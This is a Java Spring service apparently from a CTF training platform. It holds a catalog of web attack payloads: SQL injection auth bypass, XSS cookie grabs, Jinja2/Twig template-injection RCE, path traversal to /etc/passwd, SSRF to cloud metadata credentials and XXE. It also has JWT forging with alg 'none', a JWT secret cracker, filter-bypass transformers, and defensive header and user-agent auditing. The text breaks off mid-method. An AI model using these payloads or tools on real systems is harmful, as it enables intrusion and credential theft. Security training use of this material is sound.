package com.ctf.platform.service.tools;

import com.fasterxml.jackson.core.type.TypeReference;
import com.fasterxml.jackson.databind.ObjectMapper;
import lombok.RequiredArgsConstructor;
import lombok.extern.slf4j.Slf4j;
import org.springframework.stereotype.Service;

import javax.crypto.Mac;
import javax.crypto.spec.SecretKeySpec;
import java.net.URLEncoder;
import java.nio.charset.StandardCharsets;
import java.time.Instant;
import java.util.*;
import java.util.stream.Collectors;

@Slf4j
@Service
@RequiredArgsConstructor
public class WebEngineService {

    private final ObjectMapper objectMapper;

    private static final List<String> DEFAULT_WORDLIST = List.of(
            "secret", "jwt", "password", "123456", "admin", "secret123", "key",
            "supersecret", "qwerty", "token", "root", "test", "development",
            "production", "flag", "ctf", "letmein", "changeme", "default",
            "master", "pass", "12345678", "welcome", "auth", "api"
    );

    // ── 13 Web Attack Categories Payload Catalog ───────────────────
    private static final List<Map<String, Object>> PAYLOAD_DATABASE = List.of(
            // 1. SQL Injection (SQLi)
            createPayload("sqli-auth-1", "sqli", "SQL Injection", "Classic Auth Bypass (' OR 1=1--)",
                    "' OR 1=1--", "Forces WHERE clause evaluation to true, bypassing login forms.", "CRITICAL", List.of("auth", "bypass", "mysql", "sqlite")),
            createPayload("sqli-auth-2", "sqli", "SQL Injection", "Admin Comment Bypass (admin'--)",
                    "admin'--", "Truncates password verification query after username.", "CRITICAL", List.of("auth", "admin", "truncate")),
            createPayload("sqli-union-1", "sqli", "SQL Injection", "UNION SELECT Column Prober",
                    "' UNION SELECT 1,2,3,4,5--", "Determines column count and reflected data positions in results table.", "HIGH", List.of("union", "enumeration")),
            createPayload("sqli-time-1", "sqli", "SQL Injection", "Time-Based Blind (MySQL SLEEP)",
                    "' OR IF(1=1, SLEEP(5), 0)--", "Induces a 5-second database thread sleep if condition is true.", "HIGH", List.of("blind", "time", "sleep")),
            createPayload("sqli-schema-1", "sqli", "SQL Injection", "MySQL information_schema Table Dumper",
                    "' UNION SELECT table_schema, table_name, 3 FROM information_schema.tables--", "Extracts database and table names from metadata schema.", "CRITICAL", List.of("schema", "dump")),

            // 2. Cross-Site Scripting (XSS)
            createPayload("xss-script-1", "xss", "Cross-Site Scripting", "Standard Script Alert Tag",
                    "<script>alert(1)</script>", "Standard DOM execution test to verify lack of HTML entity encoding.", "HIGH", List.of("stored", "reflected", "script")),
            createPayload("xss-svg-1", "xss", "Cross-Site Scripting", "SVG Onload Filter Bypass",
                    "<svg/onload=alert(document.domain)>", "Bypasses naive <script> tag filters via XML SVG element onload.", "HIGH", List.of("svg", "event-handler")),
            createPayload("xss-img-1", "xss", "Cross-Site Scripting", "Image OnError Fallback",
                    "<img src=x onerror=alert(document.cookie)>", "Executes JavaScript when invalid image resource fails to load.", "HIGH", List.of("img", "onerror", "cookies")),
            createPayload("xss-js-1", "xss", "Cross-Site Scripting", "JavaScript URI Scheme (href)",
                    "javascript:alert(window.origin)", "Executable protocol inside a href or iframe src attribute.", "MEDIUM", List.of("uri", "href", "link")),

            // 3. Server-Side Template Injection (SSTI)
            createPayload("ssti-probe-1", "ssti", "SSTI (Template Injection)", "Polyglot Template Calculation Probe",
                    "{{7*7}}", "Universally evaluates to 49 in Jinja2, Twig, Nunjucks, and Django.", "CRITICAL", List.of("probe", "polyglot")),
            createPayload("ssti-jinja-rce", "ssti", "SSTI (Template Injection)", "Jinja2 Python OS Command Execution",
                    "{{ self.__init__.__globals__.__builtins__.__import__('os').popen('{{CMD}}').read() }}", "Escapes Jinja2 sandbox via Python object globals introspection.", "CRITICAL", List.of("jinja2", "python", "rce")),
            createPayload("ssti-twig-rce", "ssti", "SSTI (Template Injection)", "Twig PHP Execution Filter",
                    "{{_self.env.registerUndefinedFilterCallback('exec')}}{{_self.env.getFilter('{{CMD}}')}}", "Executes shell commands in PHP Twig template environments.", "CRITICAL", List.of("twig", "php", "rce")),

            // 4. Local File Inclusion & Path Traversal (LFI)
            createPayload("lfi-basic-1", "lfi", "LFI & Directory Traversal", "Standard Linux /etc/passwd Traversal",
                    "../../../../../../../../../../../../etc/passwd", "Steps up directory tree to access root system accounts file.", "HIGH", List.of("traversal", "linux")),
            createPayload("lfi-nullbyte", "lfi", "LFI & Directory Traversal", "Null Byte Extension Truncator (%00)",
                    "../../../../etc/passwd%00.png", "Truncates appended extensions in older PHP/C runtime environments.", "HIGH", List.of("nullbyte", "bypass")),
            createPayload("lfi-php-b64", "lfi", "LFI & Directory Traversal", "PHP Base64 Filter Wrapper",
                    "php://filter/convert.base64-encode/resource={{FILE}}", "Extracts raw PHP source files as Base64 strings without executing them.", "CRITICAL", List.of("php", "wrapper", "base64")),

            // 5. Command Injection (OS RCE)
            createPayload("cmdi-semi-1", "cmdi", "Command Injection", "Semicolon Command Chaining",
                    "; {{CMD}} ;", "Terminates preceding command in bash/sh and executes injected process.", "CRITICAL", List.of("bash", "sh", "chain")),
            createPayload("cmdi-pipe-1", "cmdi", "Command Injection", "Pipe Chaining (|| / |)",
                    "|| {{CMD}}", "Executes secondary command if previous command returns non-zero code.", "CRITICAL", List.of("pipe", "chain")),
            createPayload("cmdi-space-bypass", "cmdi", "Command Injection", "Space Filter Bypass using $IFS",
                    ";cat$IFS/flag.txt;", "Bypasses whitespace sanitization filters using Internal Field Separator.", "CRITICAL", List.of("bypass", "space", "ifs")),

            // 6. XML External Entity (XXE)
            createPayload("xxe-file-1", "xxe", "XML External Entity (XXE)", "SYSTEM Entity File Retrieval",
                    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"file:///{{FILE}}\">]><data>&xxe;</data>", "Forces XML parser to resolve external SYSTEM entity to local file content.", "HIGH", List.of("file", "entity")),
            createPayload("xxe-ssrf-1", "xxe", "XML External Entity (XXE)", "XXE SSRF Probe",
                    "<?xml version=\"1.0\"?><!DOCTYPE foo [<!ENTITY xxe SYSTEM \"http://{{TARGET}}/\">]><data>&xxe;</data>", "Forces parser to issue an HTTP GET request to internal infrastructure.", "HIGH", List.of("ssrf", "http")),

            // 7. Server-Side Request Forgery (SSRF)
            createPayload("ssrf-meta-1", "ssrf", "Server-Side Request Forgery", "AWS / OpenStack Cloud Metadata IP",
                    "http://169.254.169.254/latest/meta-data/iam/security-credentials/", "Queries cloud instance link-local metadata to harvest IAM role tokens.", "CRITICAL", List.of("aws", "cloud", "metadata")),
            createPayload("ssrf-loopback-hex", "ssrf", "Server-Side Request Forgery", "Hex Encoded Loopback (0x7f000001)",
                    "http://0x7f000001:8080/", "Bypasses regex checks searching for '127.0.0.1' or 'localhost'.", "HIGH", List.of("bypass", "hex", "loopback")),
            createPayload("ssrf-gopher-1", "ssrf", "Server-Side Request Forgery", "Gopher TCP Stream Injector",
                    "gopher://127.0.0.1:6379/_*1%0d%0a$4%0d%0aINFO%0d%0a", "Issues raw multi-line TCP commands to internal services like Redis.", "CRITICAL", List.of("gopher", "redis")),

            // 8. Open Redirect
            createPayload("redir-slash-1", "redirect", "Open Redirect", "Double Slash Protocol-Relative URI",
                    "//{{TARGET}}", "Interpreted by browsers as a protocol-relative external domain redirect.", "MEDIUM", List.of("protocol-relative", "slash")),
            createPayload("redir-at-1", "redirect", "Open Redirect", "UserInfo Credentials Domain Confusion",
                    "https://legit.site@{{TARGET}}", "Confuses parser into treating legit site as basic auth username.", "MEDIUM", List.of("auth", "confusion")),

            // 9. Cross-Site Request Forgery (CSRF)
            createPayload("csrf-form-1", "csrf", "CSRF PoC Generator", "Auto-Submitting HTML Form PoC",
                    "<form action=\"http://{{TARGET}}/api/change-password\" method=\"POST\">\n  <input type=\"hidden\" name=\"password\" value=\"hacked123\" />\n</form>\n<script>document.forms[0].submit();</script>",
                    "Forces browser to submit authenticated state-changing POST requests silently.", "MEDIUM", List.of("form", "autosubmit")),

            // 10. Prototype Pollution (Node.js)
            createPayload("proto-json-1", "proto", "Prototype Pollution", "JSON __proto__ Admin Injection",
                    "{\"__proto__\": {\"isAdmin\": true, \"role\": \"admin\"}}", "Injects properties into Object.prototype across all instances in Node.js apps.", "HIGH", List.of("nodejs", "json", "object")),

            // 11. CRLF & Header Injection
            createPayload("crlf-cookie-1", "crlf", "CRLF / Header Injection", "HTTP Response Splitting Set-Cookie",
                    "%0d%0aSet-Cookie: session=attacker_forged_cookie;", "Injects CRLF sequence into response headers to control Set-Cookie headers.", "MEDIUM", List.of("header", "cookie", "splitting")),

            // 12. LDAP Injection
            createPayload("ldap-auth-1", "ldap", "LDAP Injection", "Wildcard Authentication Bypass",
                    "*)(uid=*))(|(uid=*", "Bypasses LDAP authentication filters using boolean wildcard matching.", "HIGH", List.of("ldap", "active-directory")),

            // 13. NoSQL Injection (MongoDB)
            createPayload("nosql-ne-1", "nosql", "NoSQL Injection", "JSON Operator Not-Equal ($ne) Bypass",
                    "{\"username\": \"admin\", \"password\": {\"$ne\": \"invalid\"}}", "Bypasses MongoDB password check by asserting password does not equal a dummy string.", "CRITICAL", List.of("mongodb", "json", "operator")),
            createPayload("nosql-regex-1", "nosql", "NoSQL Injection", "Flag Exfiltration Regex Pattern",
                    "{\"flag\": {\"$regex\": \"^ctf{\"}}", "Probes document flags character-by-character using regex anchors.", "HIGH", List.of("mongodb", "regex", "flag"))
    );

    private static Map<String, Object> createPayload(String id, String category, String categoryLabel, String title,
                                                     String payload, String desc, String risk, List<String> tags) {
        Map<String, Object> map = new LinkedHashMap<>();
        map.put("id", id);
        map.put("category", category);
        map.put("categoryLabel", categoryLabel);
        map.put("title", title);
        map.put("payload", payload);
        map.put("desc", desc);
        map.put("risk", risk);
        map.put("tags", tags);
        return map;
    }

    public Map<String, Object> getPayloadCatalog(String category, String query) {
        List<Map<String, Object>> filtered = PAYLOAD_DATABASE.stream()
                .filter(p -> {
                    if (category != null && !category.equalsIgnoreCase("all") && !category.equalsIgnoreCase((String) p.get("category"))) {
                        return false;
                    }
                    if (query != null && !query.trim().isEmpty()) {
                        String q = query.toLowerCase().trim();
                        String title = String.valueOf(p.get("title")).toLowerCase();
                        String payload = String.valueOf(p.get("payload")).toLowerCase();
                        String desc = String.valueOf(p.get("desc")).toLowerCase();
                        return title.contains(q) || payload.contains(q) || desc.contains(q);
                    }
                    return true;
                })
                .collect(Collectors.toList());

        Map<String, Object> res = new LinkedHashMap<>();
        res.put("total", filtered.size());
        res.put("category", category == null ? "all" : category);
        res.put("payloads", filtered);
        return res;
    }

    public Map<String, Object> encodePayload(String rawPayload, String encoding, Map<String, String> replacements) {
        Map<String, Object> res = new LinkedHashMap<>();
        if (rawPayload == null) rawPayload = "";

        // Apply parameter replacements (e.g. {{TARGET}}, {{CMD}}, {{FILE}})
        String processed = rawPayload;
        if (replacements != null) {
            for (Map.Entry<String, String> entry : replacements.entrySet()) {
                String key = "{{" + entry.getKey().toUpperCase() + "}}";
                if (entry.getValue() != null && !entry.getValue().isEmpty()) {
                    processed = processed.replace(key, entry.getValue());
                }
            }
        }
        // Fallback defaults
        processed = processed.replace("{{TARGET}}", "127.0.0.1")
                .replace("{{CMD}}", "id")
                .replace("{{FILE}}", "etc/passwd");

        res.put("raw", processed);

        String enc = (encoding == null ? "raw" : encoding.toLowerCase());
        res.put("encoding", enc);

        switch (enc) {
            case "url" -> res.put("encoded", URLEncoder.encode(processed, StandardCharsets.UTF_8));
            case "double_url" -> res.put("encoded", URLEncoder.encode(URLEncoder.encode(processed, StandardCharsets.UTF_8), StandardCharsets.UTF_8));
            case "base64" -> res.put("encoded", Base64.getEncoder().encodeToString(processed.getBytes(StandardCharsets.UTF_8)));
            case "hex" -> {
                StringBuilder hex = new StringBuilder();
                for (byte b : processed.getBytes(StandardCharsets.UTF_8)) {
                    hex.append(String.format("\\x%02x", b));
                }
                res.put("encoded", hex.toString());
            }
            case "html" -> {
                StringBuilder html = new StringBuilder();
                for (char c : processed.toCharArray()) {
                    html.append(String.format("&#x%x;", (int) c));
                }
                res.put("encoded", html.toString());
            }
            default -> res.put("encoded", processed);
        }

        return res;
    }

    // ── JWT Analyzer Logic (Step 5.2.1) ────────────────────────────
    public Map<String, Object> analyzeJwt(String token, String secret) {
        Map<String, Object> result = new LinkedHashMap<>();
        if (token == null || token.trim().isEmpty()) {
            result.put("error", "JWT token string cannot be empty");
            return result;
        }

        String clean = token.trim();
        String[] parts = clean.split("\\.", -1);
        if (parts.length < 2 || parts.length > 3) {
            result.put("error", "Invalid JWT format. Expected 2 or 3 dot-separated segments.");
            return result;
        }

        try {
            // Decode Header & Payload
            String headerJson = new String(Base64.getUrlDecoder().decode(parts[0]), StandardCharsets.UTF_8);
            String payloadJson = new String(Base64.getUrlDecoder().decode(parts[1]), StandardCharsets.UTF_8);
            String signatureB64 = parts.length == 3 ? parts[2] : "";

            Map<String, Object> headerMap = objectMapper.readValue(headerJson, new TypeReference<>() {});
            Map<String, Object> payloadMap = objectMapper.readValue(payloadJson, new TypeReference<>() {});

            result.put("header", headerMap);
            result.put("payload", payloadMap);
            result.put("headerJson", objectMapper.writerWithDefaultPrettyPrinter().writeValueAsString(headerMap));
            result.put("payloadJson", objectMapper.writerWithDefaultPrettyPrinter().writeValueAsString(payloadMap));
            result.put("signatureRaw", signatureB64);

            String alg = String.valueOf(headerMap.getOrDefault("alg", "none"));
            result.put("algorithm", alg);

            // Audit Findings
            List<Map<String, String>> findings = new ArrayList<>();
            if ("none".equalsIgnoreCase(alg)) {
                findings.add(Map.of("level", "CRITICAL", "title", "Algorithm 'none' Detected",
                        "desc", "Token signature validation is completely disabled. Anyone can forge arbitrary claims."));
            } else if (alg.startsWith("HS")) {
                findings.add(Map.of("level", "INFO", "title", "HMAC Symmetric Signing (" + alg + ")",
                        "desc", "Shared secret used for both signing and verification. Vulnerable if secret is weak or bruteforceable."));
            } else if (alg.startsWith("RS")) {
                findings.add(Map.of("level", "INFO", "title", "RSA Asymmetric Signing (" + alg + ")",
                        "desc", "Private key signs, public key verifies. Check for Key Confusion (CVE-2016-5431: RS256 -> HS256)."));
            }

            // Expiration validation
            if (payloadMap.containsKey("exp")) {
                try {
                    long exp = Long.parseLong(String.valueOf(payloadMap.get("exp")));
                    Instant expInstant = Instant.ofEpochSecond(exp);
                    boolean isExpired = Instant.now().isAfter(expInstant);
                    result.put("expTimestamp", exp);
                    result.put("expIso", expInstant.toString());
                    result.put("isExpired", isExpired);
                    if (isExpired) {
                        findings.add(Map.of("level", "WARNING", "title", "Token Has Expired",
                                "desc", "Expired at " + expInstant.toString()));
                    }
                } catch (Exception ignored) {}
            } else {
                findings.add(Map.of("level", "WARNING", "title", "No Expiration ('exp') Claim",
                        "desc", "Token will remain valid indefinitely unless revoked server-side."));
            }

            result.put("findings", findings);

            // Signature verification if secret provided
            if (secret != null && !secret.trim().isEmpty() && alg.startsWith("HS")) {
                boolean verified = verifyHmac(parts[0], parts[1], signatureB64, alg, secret);
                result.put("signatureVerified", verified);
            } else if ("none".equalsIgnoreCase(alg)) {
                result.put("signatureVerified", signatureB64.isEmpty());
            }

        } catch (Exception e) {
            result.put("error", "Failed to parse JWT: " + e.getMessage());
        }

        return result;
    }

    public Map<String, Object> forgeJwt(String headerJson, String payloadJson, String alg, String secret) {
        Map<String, Object> result = new LinkedHashMap<>();
        try {
            Map<String, Object> headerMap = objectMapper.readValue(headerJson, new TypeReference<>() {});
            Map<String, Object> payloadMap = objectMapper.readValue(payloadJson, new TypeReference<>() {});

            headerMap.put("alg", alg);
            if (!headerMap.containsKey("typ")) {
                headerMap.put("typ", "JWT");
            }

            String hB64 = Base64.getUrlEncoder().withoutPadding().encodeToString(objectMapper.writeValueAsBytes(headerMap));
            String pB64 = Base64.getUrlEncoder().withoutPadding().encodeToString(objectMapper.writeValueAsBytes(payloadMap));

            String token;
            if ("none".equalsIgnoreCase(alg)) {
                token = hB64 + "." + pB64 + ".";
            } else if (alg.startsWith("HS")) {
                if (secret == null) secret = "";
                String sig = signHmac(hB64 + "." + pB64, alg, secret);
                token = hB64 + "." + pB64 + "." + sig;
            } else {
                result.put("error", "Unsupported algorithm for direct signing: " + alg + ". Supported: none, HS256, HS384, HS512.");
                return result;
            }

            result.put("token", token);
            result.put("headerJson", objectMapper.writerWithDefaultPrettyPrinter().writeValueAsString(headerMap));
            result.put("payloadJson", objectMapper.writerWithDefaultPrettyPrinter().writeValueAsString(payloadMap));
            result.put("algorithm", alg);
        } catch (Exception e) {
            result.put("error", "Failed to forge JWT: " + e.getMessage());
        }
        return result;
    }

    public Map<String, Object> crackJwtSecret(String token, List<String> customList) {
        Map<String, Object> result = new LinkedHashMap<>();
        if (token == null || !token.contains(".")) {
            result.put("error", "Invalid JWT format");
            return result;
        }

        String[] parts = token.trim().split("\\.", -1);
        if (parts.length != 3 || parts[2].isEmpty()) {
            result.put("error", "Token has no signature to crack");
            return result;
        }

        try {
            String headerJson = new String(Base64.getUrlDecoder().decode(parts[0]), StandardCharsets.UTF_8);
            Map<String, Object> headerMap = objectMapper.readValue(headerJson, new TypeReference<>() {});
            String alg = String.valueOf(headerMap.getOrDefault("alg", "HS256"));

            if (!alg.startsWith("HS")) {
                result.put("error", "Dictionary attack only supported for HMAC (HS256/384/512). Token alg is " + alg);
                return result;
            }

            Set<String> wordlist = new LinkedHashSet<>(DEFAULT_WORDLIST);
            if (customList != null) {
                wordlist.addAll(customList);
            }

            int attempts = 0;
            String signingInput = parts[0] + "." + parts[1];
            String expectedSig = parts[2];

            for (String candidate : wordlist) {
                attempts++;
                String candidateSig = signHmac(signingInput, alg, candidate);
                if (expectedSig.equals(candidateSig)) {
                    result.put("found", true);
                    result.put("secret", candidate);
                    result.put("algorithm", alg);
                    result.put("attempts", attempts);
                    return result;
                }
            }

            result.put("found", false);
            result.put("attempts", attempts);
            result.put("message", "Secret not found in the tested " + attempts + " candidate words.");
        } catch (Exception e) {
            result.put("error", "Crack error: " + e.getMessage());
        }
        return result;
    }

    private boolean verifyHmac(String headerB64, String payloadB64, String signatureB64, String alg, String secret) {
        try {
            String expected = signHmac(headerB64 + "." + payloadB64, alg, secret);
            return expected.equals(signatureB64);
        } catch (Exception e) {
            return false;
        }
    }

    private String signHmac(String data, String alg, String secret) throws Exception {
        String hmacAlg = switch (alg.toUpperCase()) {
            case "HS384" -> "HmacSHA384";
            case "HS512" -> "HmacSHA512";
            default -> "HmacSHA256";
        };

        Mac mac = Mac.getInstance(hmacAlg);
        SecretKeySpec keySpec = new SecretKeySpec(secret.getBytes(StandardCharsets.UTF_8), hmacAlg);
        mac.init(keySpec);
        byte[] sigBytes = mac.doFinal(data.getBytes(StandardCharsets.UTF_8));
        return Base64.getUrlEncoder().withoutPadding().encodeToString(sigBytes);
    }

    // ── HTTP Request & Header Security Auditor ───────────────────
    public Map<String, Object> auditHeaders(String rawHeaders) {
        Map<String, Object> result = new LinkedHashMap<>();
        if (rawHeaders == null || rawHeaders.trim().isEmpty()) {
            result.put("error", "No headers provided for audit");
            return result;
        }

        Map<String, String> headers = new LinkedHashMap<>();
        String[] lines = rawHeaders.split("\r?\n");
        String statusLine = null;
        for (String line : lines) {
            String trimmed = line.trim();
            if (trimmed.isEmpty()) continue;
            if (statusLine == null && (trimmed.startsWith("HTTP/") || trimmed.startsWith("GET ") || trimmed.startsWith("POST "))) {
                statusLine = trimmed;
                continue;
            }
            int colon = trimmed.indexOf(':');
            if (colon > 0) {
                String name = trimmed.substring(0, colon).trim().toLowerCase();
                String value = trimmed.substring(colon + 1).trim();
                headers.put(name, value);
            }
        }

        int score = 100;
        List<Map<String, Object>> checks = new ArrayList<>();

        // 1. Strict-Transport-Security (HSTS)
        String hsts = headers.get("strict-transport-security");
        if (hsts == null) {
            score -= 15;
            checks.add(Map.of("header", "Strict-Transport-Security", "status", "MISSING", "severity", "HIGH",
                    "value", "", "desc", "Missing HSTS allows SSL stripping and man-in-the-middle attacks."));
        } else {
            boolean hasSub = hsts.toLowerCase().contains("includesubdomains");
            boolean hasPreload = hsts.toLowerCase().contains("preload");
            checks.add(Map.of("header", "Strict-Transport-Security", "status", "PASS", "severity", "LOW",
                    "value", hsts, "desc", "HSTS enabled" + (hasSub ? " with includeSubDomains" : "") + (hasPreload ? " and preload" : "")));
        }

        // 2. Content-Security-Policy (CSP)
        String csp = headers.get("content-security-policy");
        if (csp == null) {
            score -= 25;
            checks.add(Map.of("header", "Content-Security-Policy", "status", "MISSING", "severity", "CRITICAL",
                    "value", "", "desc", "Missing CSP leaves the application exposed to Cross-Site Scripting (XSS) and data injection."));
        } else {
            String lowerCsp = csp.toLowerCase();
            boolean unsafeInline = lowerCsp.contains("'unsafe-inline'");
            boolean unsafeEval = lowerCsp.contains("'unsafe-eval'");
            boolean wildcard = lowerCsp.contains(" *");
            if (unsafeInline || unsafeEval || wildcard) {
                score -= 10;
                checks.add(Map.of("header", "Content-Security-Policy", "status", "WARNING", "severity", "MEDIUM",
                        "value", csp, "desc", "CSP present but contains permissive directives: " +
                                (unsafeInline ? "'unsafe-inline' " : "") + (unsafeEval ? "'unsafe-eval' " : "") + (wildcard ? "'*' wildcard " : "")));
            } else {
                checks.add(Map.of("header", "Content-Security-Policy", "status", "PASS", "severity", "LOW",
                        "value", csp, "desc", "CSP is configured with restricted script execution sources."));
            }
        }

        // 3. X-Frame-Options
        String xfo = headers.get("x-frame-options");
        if (xfo == null) {
            score -= 15;
            checks.add(Map.of("header", "X-Frame-Options", "status", "MISSING", "severity", "HIGH",
                    "value", "", "desc", "Missing X-Frame-Options allows clickjacking via iframe embedding."));
        } else {
            checks.add(Map.of("header", "X-Frame-Options", "status", "PASS", "severity", "LOW",
                    "value", xfo, "desc", "Clickjacking protection active (" + xfo + ")."));
        }

        // 4. X-Content-Type-Options
        String xcto = headers.get("x-content-type-options");
        if (xcto == null || !xcto.equalsIgnoreCase("nosniff")) {
            score -= 10;
            checks.add(Map.of("header", "X-Content-Type-Options", "status", "MISSING", "severity", "MEDIUM",
                    "value", xcto == null ? "" : xcto, "desc", "Missing or invalid nosniff enables MIME-type sniffing exploits."));
        } else {
            checks.add(Map.of("header", "X-Content-Type-Options", "status", "PASS", "severity", "LOW",
                    "value", xcto, "desc", "MIME sniffing protection enabled (nosniff)."));
        }

        // 5. Referrer-Policy
        String refPol = headers.get("referrer-policy");
        if (refPol == null) {
            score -= 5;
            checks.add(Map.of("header", "Referrer-Policy", "status", "MISSING", "severity", "LOW",
                    "value", "", "desc", "Missing Referrer-Policy may leak sensitive URLs and query tokens in Referer headers."));
        } else {
            checks.add(Map.of("header", "Referrer-Policy", "status", "PASS", "severity", "LOW",
                    "value", refPol, "desc", "Referrer policy configured (" + refPol + ")."));
        }

        // 6. Permissions-Policy
        String perm = headers.get("permissions-policy");
        if (perm == null) {
            score -= 5;
            checks.add(Map.of("header", "Permissions-Policy", "status", "MISSING", "severity", "LOW",
                    "value", "", "desc", "Missing Permissions-Policy allows browser features (camera, mic, geolocation) by default."));
        } else {
            checks.add(Map.of("header", "Permissions-Policy", "status", "PASS", "severity", "LOW",
                    "value", perm, "desc", "Hardware permissions policy defined."));
        }

        // 7. CORS (Access-Control-Allow-Origin)
        String acao = headers.get("access-control-allow-origin");
        String acac = headers.get("access-control-allow-credentials");
        if (acao != null) {
            if ("*".equals(acao) && "true".equalsIgnoreCase(acac)) {
                score -= 20;
                checks.add(Map.of("header", "Access-Control-Allow-Origin", "status", "CRITICAL", "severity", "CRITICAL",
                        "value", acao + " (Credentials: " + acac + ")", "desc", "Critical CORS misconfiguration: Wildcard origin with credentials allowed."));
            } else {
                checks.add(Map.of("header", "Access-Control-Allow-Origin", "status", "INFO", "severity", "LOW",
                        "value", acao, "desc", "CORS origin restriction: " + acao));
            }
        }

        // 8. Information Disclosure (Server, X-Powered-By)
        String server = headers.get("server");
        String xpb = headers.get("x-powered-by");
        if (server != null || xpb != null) {
            score -= 5;
            checks.add(Map.of("header", "Server / X-Powered-By", "status", "WARNING", "severity", "LOW",
                    "value", (server != null ? "Server: " + server + " " : "") + (xpb != null ? "X-Powered-By: " + xpb : ""),
                    "desc", "Server fingerprinting headers exposed to attackers."));
        }

        // 9. Cookie Security (Set-Cookie)
        String cookie = headers.get("set-cookie");
        if (cookie != null) {
            String lowerCookie = cookie.toLowerCase();
            boolean secure = lowerCookie.contains("secure");
            boolean httpOnly = lowerCookie.contains("httponly");
            boolean sameSite = lowerCookie.contains("samesite");
            if (!secure || !httpOnly) {
                score -= 10;
                checks.add(Map.of("header", "Set-Cookie", "status", "WARNING", "severity", "MEDIUM",
                        "value", cookie, "desc", "Cookie missing security flags:" + (!httpOnly ? " HttpOnly (XSS risk);" : "") + (!secure ? " Secure (cleartext transit);" : "") + (!sameSite ? " SameSite (CSRF risk);" : "")));
            } else {
                checks.add(Map.of("header", "Set-Cookie", "status", "PASS", "severity", "LOW",
                        "value", cookie, "desc", "Cookie has Secure and HttpOnly flags configured."));
            }
        }

        score = Math.max(0, Math.min(100, score));
        String grade = score >= 90 ? "A+" : score >= 80 ? "A" : score >= 70 ? "B" : score >= 60 ? "C" : score >= 50 ? "D" : "F";

        result.put("statusLine", statusLine != null ? statusLine : "N/A");
        result.put("parsedCount", headers.size());
        result.put("headers", headers);
        result.put("checks", checks);
        result.put("score", score);
        result.put("grade", grade);
        return result;
    }

    // ── SSTI & SQLi Filter Bypass Transformer ───────────────────
    public Map<String, Object> transformFilterBypass(String payload, String type, List<String> techniques) {
        Map<String, Object> result = new LinkedHashMap<>();
        if (payload == null) payload = "";
        String clean = payload.trim();
        String mode = (type == null || type.equalsIgnoreCase("sqli")) ? "sqli" : "ssti";

        Map<String, String> variants = new LinkedHashMap<>();
        variants.put("Original Payload", clean);

        if ("sqli".equalsIgnoreCase(mode)) {
            variants.put("Comments as Whitespace (/**/)", clean.replaceAll("\\s+", "/**/"));
            variants.put("Tab Whitespace (%09)", clean.replaceAll("\\s+", "%09"));
            variants.put("Newline Whitespace (%0a)", clean.replaceAll("\\s+", "%0a"));
            variants.put("Plus Whitespace (+)", clean.replaceAll("\\s+", "+"));

            // Mixed Case
            StringBuilder mixed = new StringBuilder();
            boolean upper = true;
            for (char c : clean.toCharArray()) {
                if (Character.isLetter(c)) {
                    mixed.append(upper ? Character.toUpperCase(c) : Character.toLowerCase(c));
                    upper = !upper;
                } else {
                    mixed.append(c);
                }
            }
            variants.put("Mixed Case Evasion (sElEcT)", mixed.toString());

            // Nested Keywords
            String nested = clean.replaceAll("(?i)\\bSELECT\\b", "selSELECTect")
                    .replaceAll("(?i)\\bUNION\\b", "unUNIONion")
                    .replaceAll("(?i)\\bFROM\\b", "frFROMom")
                    .replaceAll("(?i)\\bWHERE\\b", "wheWHEREre");
            variants.put("Nested Keyword Evasion (unUNIONion)", nested);

            // Hex Quoted Strings
            java.util.regex.Pattern strPattern = java.util.regex.Pattern.compile("'([a-zA-Z0-9_.-]+)'");
            java.util.regex.Matcher m = strPattern.matcher(clean);
            StringBuilder hexSb = new StringBuilder();
            while (m.find()) {
                String inner = m.group(1);
                StringBuilder hx = new StringBuilder("0x");
                for (byte b : inner.getBytes(StandardCharsets.UTF_8)) {
                    hx.append(String.format("%02x", b));
                }
                m.appendReplacement(hexSb, hx.toString());
            }
            m.appendTail(hexSb);
            variants.put("Hex Literal String Quotes (0x...)", hexSb.toString());

            variants.put("MySQL Hash Comment (#)", clean.replaceAll("-- -|--", "#"));
            variants.put("C-Style Block Comment (/*)", clean.replaceAll("-- -|--", "/*") + "*/");
            variants.put("Null-Byte Terminator (;%00)", clean + ";%00");
        } else {
            // SSTI
            String brackets = clean.replaceAll("\\.([a-zA-Z_][a-zA-Z0-9_]*)", "['$1']");
            variants.put("Bracket Key Lookup (['attr'])", brackets);
            variants.put("Request Args Bypass (request.args.param)", clean.replaceAll("'([^']+)'", "request.args.param"));
            variants.put("String Concatenation (('__cl'+'ass__'))", clean.replaceAll("'__class__'", "('__cl'+'ass__')").replaceAll("'os'", "('o'+'s')"));
            variants.put("Hex Escaped Attribute (\\x5f\\x5fclass\\x5f\\x5f)", clean.replaceAll("__class__", "\\x5f\\x5fclass\\x5f\\x5f"));
            variants.put("Cycler Sandbox Escaper", "{{ cycler.__init__.__globals__.os.popen('id').read() }}");
        }

        result.put("type", mode);
        result.put("input", clean);
        result.put("variants", variants);
        result.put("count", variants.size());
        return result;
    }

    // ── User-Agent Fingerprint Analyzer ──────────────────────────
    public Map<String, Object> parseUserAgent(String ua) {
        Map<String, Object> result = new LinkedHashMap<>();
        if (ua == null || ua.trim().isEmpty()) {
            result.put("error", "User-Agent string cannot be empty");
            return result;
        }

        String raw = ua.trim();
        String lower = raw.toLowerCase();

        String browser = "Unknown";
        String browserVersion = "Unknown";
        String os = "Unknown";
        String engine = "Unknown";
        String device = "Desktop";
        boolean isBot = false;
        String botName = null;
        List<String> ctfAlerts = new ArrayList<>();

        if (lower.contains("sqlmap")) { isBot = true; botName = "sqlmap (Automated SQL Injection Scanner)"; ctfAlerts.add("Automated SQLi scanner header detected."); }
        else if (lower.contains("nikto")) { isBot = true; botName = "Nikto Web Vulnerability Scanner"; ctfAlerts.add("Security vulnerability scanner detected."); }
        else if (lower.contains("nmap")) { isBot = true; botName = "Nmap Scripting Engine (NSE)"; ctfAlerts.add("Port scanner / NSE probe detected."); }
        else if (lower.contains("gobuster")) { isBot = true; botName = "Gobuster Directory Fuzzer"; ctfAlerts.add("Directory brute-force fuzzer detected."); }
        else if (lower.contains("dirbuster")) { isBot = true; botName = "DirBuster Scanner"; }
        else if (lower.contains("curl/")) { isBot = true; botName = "curl CLI Client"; ctfAlerts.add("CLI command-line tool user-agent."); }
        else if (lower.contains("python-requests")) { isBot = true; botName = "Python Requests Library"; ctfAlerts.add("Scripted Python client."); }
        else if (lower.contains("wget/")) { isBot = true; botName = "Wget CLI Tool"; }
        else if (lower.contains("googlebot")) { isBot = true; botName = "Googlebot Search Indexer"; }
